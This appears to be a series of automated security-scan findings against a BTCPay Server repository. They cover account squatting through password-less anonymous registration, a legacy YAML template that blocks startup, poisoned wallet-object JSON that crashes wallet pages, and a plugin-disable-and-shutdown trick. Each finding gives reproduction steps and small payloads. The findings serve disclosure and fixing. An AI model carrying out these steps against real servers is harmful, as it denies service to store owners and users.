Root cause: the anonymous registration API accepts accounts with no credential and, unlike every other password-less creation path in the codebase, delivers no claim link to the mailbox owner, while the self-service recovery path categorically refuses to issue a reset link to credential-less accounts. The combination leaves no user-reachable way to claim an account created under one's own e-mail address, so a one-request squat becomes a permanent (until admin intervention) denial of that identity. It is reachable only on instances where the administrator has enabled public registration (LockSubscription=false; locked by default after the first admin because disable-registration defaults to true) and left e-mail confirmation at its default of off.

## Evidence
1. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:322–396](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L322-L396)
   POST /api/v1/users is [AllowAnonymous]; Email is the only required field. hasPassword (378) is false when Password is omitted and line 396 calls UserManager.CreateAsync(user) with no password, persisting an account with PasswordHash null, Approved=false and RequiresEmailConfirmation copied from the server policy. Only the per-IP 'register' throttle (2r/min, Startup.cs:308) applies to non-admins; one request suffices.
2. [BTCPayServer/Events/UserEvent.cs:33–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Events/UserEvent.cs#L33-L43)
   Registered.Create returns a plain Registered event when invitedBy is null (37-38). For an anonymous caller _userManager.GetUserAsync(User) is null, so no invitation token is generated and no Invited event (the only carrier of a set-password link) is produced.
3. [BTCPayServer/Plugins/Emails/HostedServices/UserEventTriggerHostedService.cs:46–75](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/HostedServices/UserEventTriggerHostedService.cs#L46-L75)
   For a Registered event an e-mail reaches the mailbox owner only if the event is Invited (invitation link) or RequiresEmailConfirmation is on and unconfirmed (confirmation link, whose ConfirmEmail handler redirects to SetPassword). With the default RequiresConfirmedEmail=false and a non-Invited event, nothing is sent: the mailbox owner never receives any link to claim the account.
4. [BTCPayServer/Controllers/UIAccountController.cs:661–678](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L661-L678)
   ForgotPassword looks the user up by e-mail and requires userService.CanLogin before minting a reset link (671); for a password-less account it silently redirects to ForgotPasswordConfirmation without publishing PasswordResetRequested, so the legitimate mailbox owner can never obtain a set-password link through self-service.
5. [BTCPayServer/Services/UserService.cs:155–168](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/UserService.cs#L155-L168)
   DefaultLoginExtension adds a login failure when PasswordHash is null (161-162), so CanLogin is false for the squatted account; this is the gate ForgotPassword relies on.
6. [BTCPayServer/wwwroot/swagger/v1/swagger.template.users.json:279–282](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/swagger/v1/swagger.template.users.json#L279-L282)
   The published API contract states: 'if no password is set, an email will be sent to the user requiring him to set the password'. The code honours this only for authenticated (Invited) creators; for anonymous callers no such e-mail exists, so the behaviour contradicts the project's own documentation rather than being intended design.
7. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:336–341](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L336-L341)
   Anonymous creation is refused only when an admin exists AND policies.LockSubscription is true. The path is open on any instance whose administrator has enabled public registration (Server Settings > Policies 'Enable public user registration').
8. [BTCPayServer/Controllers/UIAccountController.cs:540–591](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L540-L591)
   The victim's own /register attempt for the same address fails on CreateAsync with DuplicateUserName (AddErrors at 591). RegisterViewModel.Password is [Required], so the UI can neither create nor repair the password-less variant; /login fails because CheckPasswordAsync is false for a null hash (177-178).
9. [BTCPayServer/Controllers/UIUserStoresController.cs:70–73](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIUserStoresController.cs#L70-L73)
   Store invitations are not a recovery route: /invitations/{token} requires a Cookie-authenticated session (CanModifyProfile), and AddStoreUser publishes an Invited event only for users it newly creates (GreenfieldStoreUsersController.cs 220-249), not for the existing squatted account. Only a server admin can repair it (UIServerController.Users.cs reset-password 238-246 or verification-email 453-461).

## Impact
No data is disclosed or modified and the attacker gains no control of the squatted account. The impact is that a chosen victim is deterministically prevented from registering, logging in or recovering an account under their e-mail address on this server until an administrator manually resets the password or sends a verification e-mail: a targeted loss of availability of the registration/recovery function for that identity, not of the service as a whole.

## Reproduction steps
1. An unauthenticated network client sends one JSON POST to /api/v1/users containing only the victim's e-mail and no password; no antiforgery, CAPTCHA or authentication applies, and the 2r/min per-IP throttle is irrelevant for a single targeted request. The account is created with no credential and no claim link is sent. Conditions outside the attacker's control: the operator must have enabled public registration (a supported, documented feature, non-default after the first admin) and left RequiresConfirmedEmail at its default of off, hence AT:PRESENT. No victim interaction is needed.

## Recommended fix
1. POST /api/v1/users lets unauthenticated callers create accounts without any credential (password-less CreateAsync) under arbitrary e-mail addresses, and for anonymous creators no invitation/claim e-mail is produced although the API documentation promises one. Fix criteria: Anonymous self-registration must either require a password or always deliver a claim link to the mailbox owner (treat password-less creation as an invitation to the e-mail owner regardless of RequiresConfirmedEmail). Verification: an anonymous POST without password is either rejected, or results in the mailbox owner receiving a link that lets them set a password and log in.
2. ForgotPassword refuses to issue a reset link to an account whose only CanLogin failure is 'no password set', so a credential-less account under the victim's e-mail can never be claimed through self-service. Fix criteria: The forgot-password flow must treat a password-less account that is otherwise not disabled as eligible for a set-password link sent to the registered e-mail. Verification: create a password-less user, request forgot-password for that e-mail, and confirm the mailbox owner receives a working set-password link.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Weak password recovery
**CWE:** [CWE-640](https://cwe.mitre.org/data/definitions/640.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257646

---

# Store-owner legacy PoS/Crowdfund YAML template aborts startup migration, bricking server on upgrade

## Details
MigrationStartupTask.MigrateAppYmlToJson (BTCPayServer/Hosting/MigrationStartupTask.cs:410-440) runs once on any deployment whose MigrationSettings.MigrateAppYmlToJson flag is still false, i.e. a database created on a release before 1.10.0, when PoS and Crowdfund item templates were stored as YAML (Changelog.md:1450, PR #4792); fresh installs set every migration flag true on first run (ExecuteAsync first-run block). It loads every PointOfSale and Crowdfund AppData row and calls ParsePOSYML on the store-owner-written Template / PerksTemplate string. ParsePOSYML (442-538) hard-casts each top-level entry of the YAML mapping: ((YamlScalarNode)posItem.Key) at line 455 and (YamlMappingNode)posItem.Value at line 467. A template containing a top-level entry whose value is a scalar, a sequence or empty (e.g. 'foo: bar' or a bare 'foo:') or whose key is a complex (non-scalar) node throws InvalidCastException. There is no per-row try/catch, SaveChangesAsync runs only after the loop, ExecuteAsync (242-246) logs and rethrows, the flag is never set (206-211), and StartWithTasksAsync (HostExtensions.cs:23-36) awaits the task before host.StartAsync, so Kestrel never listens. In Program.Main (94-121) the exception's Source is 'BTCPayServer', which PluginManager.IsExceptionByPlugin (PluginManager.cs:45-58) matches against the system-plugin entry registered for the main assembly (PluginManager.cs:185-190); the catch logs a misleading 'plugin crash during startup', DisablePlugin is a no-op for system plugins (PluginManager.cs:583) and Main returns with the host never started (a YamlException would instead escape Main unhandled). Every restart repeats the same failure until an operator hand-edits the Apps.Settings row in PostgreSQL. All tenants, checkout, the Greenfield API and the admin UI are unavailable.

Attacker and input: the template is tenant data written by any store owner (adversary 4; any self-registered user who creates a store) through the PoS/Crowdfund settings pages or the Greenfield app endpoints, both of which existed in the YAML era (PoS update via Greenfield since 1.6.11, Crowdfund create since 1.7.0; Changelog.md:1970, 1898). The attack is a stored time bomb: the template is saved on a pre-1.10 instance, the server keeps running, and when the operator performs a routine upgrade to any later release including 2.4.5 the server never comes back.

Explicit assumption (this checkout is a single squashed commit, so the legacy writer is not present to read): the legacy YAML writer accepted such templates. The legacy AppService.Parse selected kv.Value as YamlMappingNode and filtered .Where(kv => kv.Value != null), silently dropping non-mapping entries instead of throwing, and the legacy Greenfield ToPointOfSaleSettings / ToCrowdfundSettings stored request.Template verbatim after a validate-only call. The vestigial comment '// Just checking if we can serialize' that still precedes the validation at GreenfieldAppsController.cs:470 and :553 corroborates that validation and storage were separate steps. If every legacy writer had instead re-serialised the parsed items (as the current UI and Greenfield code do), stored templates would be normalised and this path would be unreachable; the finding holds only for data written by such a tolerant legacy writer, on deployments upgrading from a release before 1.10.0.

The same structure (no per-row isolation, flag set only after full success, exception stops the host) applies to the other flag-gated migrations in this file that parse tenant-written data, but for those the stored values were validated at write time by the same parser the migration uses.

## Evidence
1. [BTCPayServer/Hosting/MigrationStartupTask.cs:442–538](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/MigrationStartupTask.cs#L442-L538)
   ParsePOSYML parses the stored template with YamlDotNet and performs unchecked casts: `((YamlScalarNode)posItem.Key)` at line 455 and `(YamlMappingNode)posItem.Value` at line 467. A top-level entry whose value is a scalar or sequence (e.g. `foo: bar`), or a non-scalar key, throws InvalidCastException; malformed YAML throws YamlException from stream.Load at line 449. No exception handling exists in the function.
2. [BTCPayServer/Hosting/MigrationStartupTask.cs:410–440](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/MigrationStartupTask.cs#L410-L440)
   MigrateAppYmlToJson loads every PointOfSale and Crowdfund AppData row and calls ParsePOSYML on each store-owner-supplied Template / PerksTemplate without try/catch. A single tenant's template that throws aborts the whole migration before SaveChangesAsync, so no app is migrated and the exception propagates.
3. [BTCPayServer/Hosting/MigrationStartupTask.cs:206–211](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/MigrationStartupTask.cs#L206-L211)
   The MigrateAppYmlToJson flag is only set to true after the migration returns successfully. On exception the flag stays false, so the same failing migration re-runs on every subsequent start.
4. [BTCPayServer/Hosting/MigrationStartupTask.cs:242–246](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/MigrationStartupTask.cs#L242-L246)
   ExecuteAsync logs and rethrows any exception from the data migrations; nothing isolates a failing per-tenant migration from the rest of startup.
5. [BTCPayServer/Extensions/HostExtensions.cs:23–36](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions/HostExtensions.cs#L23-L36)
   StartWithTasksAsync awaits every IStartupTask before host.StartAsync; a throwing MigrationStartupTask means Kestrel never starts listening.
6. [BTCPayServer/Program.cs:94–121](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Program.cs#L94-L121)
   Main wraps StartWithTasksAsync in catches for ConfigException and plugin-attributed exceptions only. The InvalidCastException from ParsePOSYML carries Source 'BTCPayServer', which IsExceptionByPlugin matches to the system-plugin entry for the main assembly (PluginManager.cs:45-58, 185-190); the handler logs a misleading plugin crash, DisablePlugin is a no-op for system plugins (PluginManager.cs:583), and Main returns with the host never started. A YamlException would escape Main unhandled instead. Either way the process exits without listening, and every restart (Docker restart policy or manual) repeats the failure until the database row is repaired by hand.
7. [BTCPayServer.Data/Data/AppData.cs:34–42](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Data/Data/AppData.cs#L34-L42)
   AppData.Settings (containing Template / PerksTemplate) is JSON persisted from store-owner input via the PoS/Crowdfund settings UI and Greenfield API; it is the only source of the YAML the migration parses.

## Impact
The whole server (all stores, checkout, API, admin UI) fails to start and crash-loops until an operator hand-edits the database; no data is disclosed or altered by the attacker beyond their own template.

## Reproduction steps
1. Attacker: any store owner (self-registered user with a store, or invited owner) on a BTCPay instance still running a release before 1.10.0, where templates were stored as YAML. They save a PoS or Crowdfund template containing a non-mapping top-level entry (e.g. 'foo: bar' or 'foo:') over the web UI or Greenfield API (network, low privilege, no user interaction: the operator's later upgrade is routine and not interaction with attacker content). When the operator upgrades to any release carrying this migration, including 2.4.5, MigrateAppYmlToJson runs once with the flag false, ParsePOSYML throws InvalidCastException on that template, and the host never starts, on every restart. AT:PRESENT: requires the deployment to be in the pre-1.10 state when the template is written and relies on the stated assumption, not verifiable in this squashed checkout, that the legacy writer validated with a parser that filtered non-mapping entries and stored the raw template.

## Recommended fix
1. ParsePOSYML assumes every top-level YAML entry is a scalar key with a mapping value and casts unconditionally, so tenant-supplied text can throw out of a startup-critical code path. Fix criteria: Parsing of a legacy template must never throw for any input string: non-mapping values, non-scalar keys and unparsable YAML are skipped or yield an empty item list. Verify by running ParsePOSYML over templates such as `foo: bar`, `- a`, and invalid YAML and confirming a result (possibly empty) is returned.
2. MigrateAppYmlToJson (and ExecuteAsync generally) provides no isolation between tenants: one app's failure aborts the migration for all apps, leaves the flag unset, and terminates the process on every start. Fix criteria: A failure to migrate one AppData row must be logged and must not prevent the remaining rows from being migrated, the flag from being set, or the host from starting (e.g. leave the offending template untouched or empty). Verify by seeding one app with a throwing template and one valid app, starting the server, and confirming it listens and the valid app is migrated.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Uncaught exception
**CWE:** [CWE-248](https://cwe.mitre.org/data/definitions/248.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257641

---

# Unvalidated wallet-object jsonb from Greenfield poisons label colour/rates and crashes wallet UI

## Details
Wallet objects are a free-form graph persisted as jsonb (WalletObjects.Data). The Greenfield endpoint POST /api/v1/stores/{storeId}/payment-methods/{pmi}/wallet/objects (AddOrUpdateOnChainWalletObject, policy CanManageWalletTransactions, GreenfieldStoreOnChainWalletsController.cs:775-803) stores caller-supplied Type, Id and Data with no validation beyond 'Type and Id required', and SetWalletObject (WalletRepository.cs:804-811) upserts the raw JSON with ON CONFLICT DO UPDATE SET Data. Type is not restricted to WalletObjectData.Types, so the caller can create or overwrite objects of the system types 'label' and 'tx'. Every reader then treats the stored jsonb as BTCPay-produced and parses it with throwing APIs and no fallback:

- label objects: Data.color is read verbatim (WalletRepository.cs:271, 323-345, 418/466, 486) and fed to ColorPalette.TextColor (ColorPalette.cs:24-28) -> System.Drawing.ColorTranslator.FromHtml, which throws ArgumentException for any string that is not a #rgb/#rrggbb literal, a known colour name or an integer (assumption: System.Drawing.Primitives as shipped in the net10.0 shared framework). A non-scalar color (object/array) throws InvalidCastException in JToken.Value<string>() at line 271/486.
- tx objects: Data.rates is handed to RateBook.FromJObject (RateBook.cs:130-139), which decimal.Parse()s every property value, so {"rates":{"USD":"x"}} throws FormatException; a non-scalar Data.comment throws at WalletRepository.cs:263.

The only exception handling is the global UseExceptionHandler("/errors/{0}") (Hosting/Startup.cs:336), so each affected request becomes a persistent HTTP 500 for every member of the store:

1. GET /wallets/{walletId} and /transactions (UIWalletsController.cs:749-757) calls GetWalletLabelsByLinkedTypeWithUsage(..., includeUnusedLabels: true) and runs TextColor on EVERY label object of the wallet before any transaction is loaded. Creating one new label object (e.g. {"type":"label","id":"x","data":{"color":"bogus"}}) is enough; overwriting a system label such as 'invoice' is not required. The wallet landing page then 500s for all members, including the Owner.
2. WalletPSBTReady (UIWalletsController.PSBT.cs:477 -> FetchTransactionDetails 408-443) runs CreateTransactionTagModels (LabelService.cs:59-66, 163-169) for the PSBT's inputs/outputs for every command including broadcast; linking the poisoned label to tx/address/utxo objects (via /links, the UI update-labels endpoint, or by poisoning the 'invoice' label that is attached to every invoice-paid coin) blocks PSBT review and broadcast of those coins in the UI.
3. Reserved Addresses (WalletRepository.cs:466-473), transaction export (UIWalletsController.cs:2108-2124), the dashboard Recent Transactions widget (Components/StoreRecentTransactions.cs:60-66), labels.json (UIWalletsController.cs:2183-2206) and the labels management page WalletLabels (2210-2227) fail the same way; the rates variant additionally breaks the Greenfield transaction listing for every API consumer, because GetOnChainWalletTransactions (GreenfieldStoreOnChainWalletsController.cs:185) loads WalletTransactionInfo for ALL tx-type objects of the wallet regardless of id.

Recovery: the WalletLabels UI page itself throws on a poisoned custom label (and filters out system-type labels), so the Owner cannot delete the object from the UI; the only repair is DELETE .../wallet/objects/{type}/{id} through the Greenfield API, and re-adding the label from the UI does not fix it because AddWalletObjectLabels inserts with ON CONFLICT DO NOTHING.

Attacker: a store member or API key holding only btcpay.store.canmanagewallettransactions (built-in Multisigner role from migration 20260203123000_AddWalletRoles, or a narrow API key) - a position whose sanctioned paths (UpdateLabels, ImportWalletLabels) only ever assign ColorPalette.DeterministicColor and never a free colour or rates. One authenticated POST persistently denies the store's wallet UI, PSBT review/broadcast and (rates variant) the API transaction listing to the Owner and every other member.

Root cause: AddOrUpdateOnChainWalletObject/SetWalletObject accept an unconstrained Type and Data (GreenfieldAPITests.cs:4359-4362 shows arbitrary types/data are an intended feature), while WalletRepository, LabelService, RateBook and the wallet controllers treat the stored jsonb as trusted, well-formed data. ColorPalette.IsValid exists but is applied only to the store brand colour (UIStoresController.Settings.cs:93, GreenfieldStoresController.cs:352), never to label colours.

## Evidence
1. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainWalletsController.cs:775–802](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainWalletsController.cs#L775-L802)
   AddOrUpdateOnChainWalletObject (CanManageWalletTransactions) accepts arbitrary Type, Id and a free-form Data JObject and passes them unvalidated to WalletRepository.SetWalletObject. Type is not restricted to WalletObjectData.Types, so a caller can create or OVERWRITE the data of any object in the wallet, including system label objects such as label/invoice.
2. [BTCPayServer/Services/WalletRepository.cs:804–810](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/WalletRepository.cs#L804-L810)
   SetWalletObject upserts the raw JSON with ON CONFLICT DO UPDATE SET Data=EXCLUDED.Data; no schema or value validation of Data for any type.
3. [BTCPayServer/Services/WalletRepository.cs:253–279](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/WalletRepository.cs#L253-L279)
   GetWalletTransactionsInfoCore trusts stored Data: data["comment"].Value<string>() and link.objectdata["color"].Value<string>() throw InvalidCastException for non-scalar values, and data["rates"] is handed to RateBook.FromJObject which throws on any non-decimal value. This is the single loader behind the wallet transaction list, PSBT review, export, dashboard widget and Greenfield transaction listing.
4. [BTCPayServer/Services/Invoices/RateBook.cs:130–138](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/RateBook.cs#L130-L138)
   FromJObject uses decimal.Parse on every property of the stored rates object; a poisoned value like {"rates":{"USD":"x"}} throws FormatException for every reader of that tx object.
5. [BTCPayServer/Services/WalletRepository.cs:314–346](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/WalletRepository.cs#L314-L346)
   GetWalletLabelsByLinkedTypeWithUsage returns wo.Data->>'color' verbatim (only an empty/null colour falls back to the palette).
6. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs:749–756](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.cs#L749-L756)
   WalletTransactions GET (the wallet landing page, /wallets/{walletId} and /transactions) calls GetWalletLabelsByLinkedTypeWithUsage(..., includeUnusedLabels: true) and runs ColorPalette.Default.TextColor(c.Color) on every label object of the wallet, used or not, before any transaction is loaded. One label object with a non-parseable colour - a freshly created one is enough - makes this page throw for every store member on every request; no try/catch, only the global /errors/500 handler.
7. [BTCPayServer/ColorPalette.cs:24–27](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/ColorPalette.cs#L24-L27)
   TextColor(string) calls System.Drawing.ColorTranslator.FromHtml on the stored string, which throws for anything that is not a #rgb/#rrggbb literal, a known colour name or an integer (assumption: System.Drawing.Primitives behaviour shipped with net10.0). No try/catch anywhere on this path.
8. [BTCPayServer/Services/Labels/LabelService.cs:59–65](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Labels/LabelService.cs#L59-L65)
   CreateTransactionTagModels computes TextColor(color) for every attachment and label (also at 163-169); it is used by the transaction list, PSBT review (UIWalletsController.PSBT.cs:432,440 via WalletPSBTReady), export filtering, and the dashboard widget.
9. [BTCPayServer/Services/WalletRepository.cs:466–472](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/WalletRepository.cs#L466-L472)
   GetReservedAddressesWithDetails also calls TextColor on the stored colour, so the Reserved Addresses page (receive flow) fails as well when a poisoned label is linked to an address.
10. [BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.PSBT.cs:408–442](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/UIWalletsController.PSBT.cs#L408-L442)
   FetchTransactionDetails is executed for every WalletPSBTReady command (line 477), including broadcast; it loads WalletTransactionInfo for the PSBT's tx/address/utxo objects and runs CreateTransactionTagModels, so a poisoned label or rates object linked to any involved object blocks review and broadcast of PSBTs in the UI.
11. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainWalletsController.cs:183–185](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainWalletsController.cs#L183-L185)
   GetOnChainWalletTransactions loads WalletTransactionInfo for ALL tx objects of the wallet; a single tx object with poisoned rates makes the Greenfield transaction listing fail for every API consumer of the store.

## Impact
No confidentiality or integrity impact on funds or data (the poisoned row is metadata). Availability: the store's wallet landing/transactions page, labels.json, labels management page, transaction export, reserved addresses page, dashboard widget and PSBT review/broadcast touching labelled coins return 500 persistently for every member of the store, and the rates variant breaks the Greenfield transaction listing for all API consumers of that store, until the row is deleted via the Greenfield API. Rated LOW rather than HIGH because the loss is partial: it is confined to one store's wallet management surfaces on a multi-tenant server, invoicing/payments and the rest of the store and server keep working, funds can still be moved via the Greenfield wallet transaction endpoints, and an Owner or API key with the same permission can repair it with one DELETE.

## Reproduction steps
1. Attacker: a store member or API key with btcpay.store.canmanagewallettransactions on the target store (built-in Multisigner role, or a limited API key) - a lesser position than Owner/CanManageWalletSettings and one the threat model names as adversary 3. Delivery: one authenticated Greenfield POST to /wallet/objects with type=label and data.color set to a non-colour string (any id; overwriting a system label is optional and only widens the PSBT impact), or type=tx with data.rates containing a non-decimal. No defence stands in the way: the endpoint checks only that Type and Id are present, no colour/rates validation exists, and no reader has a try/catch. Works against a default deployment; no user interaction; not store-crossing (walletId is derived from the route storeId and the policy is store-scoped).

## Recommended fix
1. AddOrUpdateOnChainWalletObject / WalletRepository.SetWalletObject persist caller-supplied Type and Data without validating them, allowing system label objects to be overwritten with values BTCPay's own readers cannot parse. Fix criteria: Writes through the Greenfield object/link endpoints must validate Data per type (label.color must satisfy ColorPalette.Pattern or be absent; tx.rates must be an object of decimal strings; comment must be a string) and reject or ignore unknown shapes. Verify: POST a label with color 'bogus' or a tx with rates {"USD":"x"} returns a 422 validation error and the wallet pages keep rendering.
2. Readers (WalletRepository.GetWalletTransactionsInfoCore, FormatToLabel, GetWalletLabelsByLinkedTypeWithUsage, GetReservedAddressesWithDetails, LabelService.CreateTransactionTagModels, UIWalletsController label mapping, RateBook.FromJObject) treat stored jsonb as trusted and use throwing parsers with no fallback, so one malformed row takes down every page that loads the wallet's objects. Fix criteria: Loading wallet objects must be fault tolerant: an unparsable colour falls back to ColorPalette.DeterministicColor, unparsable rates/comments are skipped, and non-scalar JSON values are ignored. Verify with a stored label whose color is 'bogus' and a tx whose rates contain a non-number: /wallets/{id}, PSBT review, export, reserved addresses and the Greenfield transaction list all succeed.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper Input Validation
**CWE:** [CWE-1286](https://cwe.mitre.org/data/definitions/1286.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257589

---

# Exception-message substring attribution lets a store user disable a plugin and stop the server

## Details
PluginManager.IsExceptionByPlugin (BTCPayServer/Plugins/PluginManager.cs:38-73) decides which plugin 'caused' an exception. After the stack-trace scan it falls back to two heuristics over every loaded plugin: `exception.Source == assemblyName` and `exception.Message.Contains(assemblyName, Ordinal)` (line 59). The second treats any exception whose text happens to contain a plugin's assembly name as that plugin's fault. PluginExceptionHandler (Plugins/PluginManager/PluginExceptionHandler.cs:21-39), registered through AddExceptionHandler and invoked by UseExceptionHandler for every unhandled request exception, then writes `disable:<assemblyName>` into <PluginDir>/commands via PluginManager.DisablePlugin (581-592) and calls StopApplication 3 s later; GetDisablePluginIfCrash is unconditionally true (41-45), so no request is exempt.

Many BCL exceptions echo the caller's input into their message, and the project does not catch them. A concrete, deterministic path needing only a store-level cookie session: `GET /stores/{storeId}/payment-requests?SearchTerm=status:<Name>` (UIPaymentRequestController.cs:97-114, policy CanViewPaymentRequests). SearchTerm is model-bound (BasePagingViewModel.cs:30, 42-52), parsed by SearchString (SearchString.cs:39-51) into a `status` filter whose values are passed verbatim to `Enum.Parse<PaymentRequestStatus>(s, true)`; an unknown value throws `ArgumentException("Requested value '<Name>' was not found.")` (System.Private.CoreLib message format, net10.0 assumption) from the BCL, so exception.Source is not 'BTCPayServer'. The only global MVC exception filters handle JsonHttpException/JsonObjectException (Startup.cs:168-171), so the exception reaches PluginExceptionHandler. If <Name> is the assembly name of an installed third-party plugin, the handler disables that plugin persistently and shuts the process down. The same shape exists at UIStorePullPaymentsController.PullPayments.cs:314 (`Enum.Parse<PayoutState>(vm.Command...)`) and UICrowdfundController.cs:447.

Limiting condition (deployment state, not attacker control): because TopologicalSort (146-160) enumerates system plugins first and their assembly is 'BTCPayServer', any message containing the substring 'BTCPayServer' is attributed to a system plugin and ignored; so plugins named `BTCPayServer.Plugins.*` are shielded by accident and the attack works against third-party plugins whose assembly name lacks that substring (such names exist in the ecosystem — e.g. `SamRockProtocol` in this file's own IncompatiblePlugins list). Plugin names are public (plugin-builder directory, plugin routes), and the attacker can enumerate candidates at no cost since a non-matching name just returns a 500.

Who: any authenticated user with a store (registration is open by default and every user may create a store; also any store member whose role carries CanViewPaymentRequests, plus API-less cookie sessions only). What they gain: shutdown of the whole multi-tenant server (restart depends on an external supervisor; a bare `dotnet BTCPayServer.dll` run stays down) and durable removal of a plugin's functionality (e.g. a payment-method or exchange plugin) until an administrator notices and re-enables it. Repeating per vulnerable plugin yields repeated outages. Root cause: attribution of fault by free-text substring match on exception messages that carry untrusted input, coupled with an automatic disable-and-stop reaction that has no manual confirmation.

## Evidence
1. [BTCPayServer/Plugins/PluginManager.cs:59–63](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PluginManager.cs#L59-L63)
   IsExceptionByPlugin attributes any exception to a loaded plugin when exception.Message merely contains the plugin assembly's simple name (ordinal substring, line 59). BCL exception messages routinely echo caller-supplied input (Enum.Parse: "Requested value '<s>' was not found."), so which plugin is blamed is attacker-steerable; this is the line the fix must change.
